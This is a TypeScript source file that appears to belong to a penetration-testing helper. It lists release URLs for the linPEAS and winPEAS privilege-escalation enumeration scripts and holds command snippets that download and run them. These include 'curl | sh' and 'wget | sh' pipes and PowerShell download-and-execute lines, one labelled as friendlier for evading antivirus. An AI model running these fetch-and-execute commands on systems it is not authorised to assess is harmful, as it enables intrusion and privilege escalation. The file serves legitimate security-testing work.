export interface PeasAsset {
  id: string;
  label: string;
  url: string;
  platform: 'linux' | 'windows';
}

const RELEASE_BASE = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download';

export const PEAS_ASSETS: PeasAsset[] = [
  { id: 'linpeas', label: 'linpeas.sh', url: `${RELEASE_BASE}/linpeas.sh`, platform: 'linux' },
  { id: 'winpeas-bat', label: 'winPEAS.bat', url: `${RELEASE_BASE}/winPEAS.bat`, platform: 'windows' },
  { id: 'winpeas-x64', label: 'winPEASx64.exe', url: `${RELEASE_BASE}/winPEASx64.exe`, platform: 'windows' },
  { id: 'winpeas-x86', label: 'winPEASx86.exe', url: `${RELEASE_BASE}/winPEASx86.exe`, platform: 'windows' },
  { id: 'winpeas-any', label: 'winPEASany.exe', url: `${RELEASE_BASE}/winPEASany.exe`, platform: 'windows' },
];

export interface PeasRunSnippet {
  id: string;
  label: string;
  command: string;
  platform: 'linux' | 'windows';
}

export const PEAS_RUN_SNIPPETS: PeasRunSnippet[] = [
  {
    id: 'curl-pipe',
    label: 'curl | sh (direct, no file left behind)',
    command: `curl -L ${RELEASE_BASE}/linpeas.sh | sh`,
    platform: 'linux',
  },
  {
    id: 'wget-pipe',
    label: 'wget | sh',
    command: `wget -qO- ${RELEASE_BASE}/linpeas.sh | sh`,
    platform: 'linux',
  },
  {
    id: 'linpeas-to-file',
    label: 'Download then run, tee output to file',
    command: `curl -L ${RELEASE_BASE}/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas-out.txt`,
    platform: 'linux',
  },
  {
    id: 'winpeas-iwr',
    label: 'PowerShell download + run',
    command: `iwr -Uri ${RELEASE_BASE}/winPEASx64.exe -OutFile winpeas.exe; .\\winpeas.exe`,
    platform: 'windows',
  },
  {
    id: 'winpeas-bat-run',
    label: 'winPEAS.bat (no exe, AV-friendlier)',
    command: `iwr -Uri ${RELEASE_BASE}/winPEAS.bat -OutFile winpeas.bat; .\\winpeas.bat`,
    platform: 'windows',
  },
];
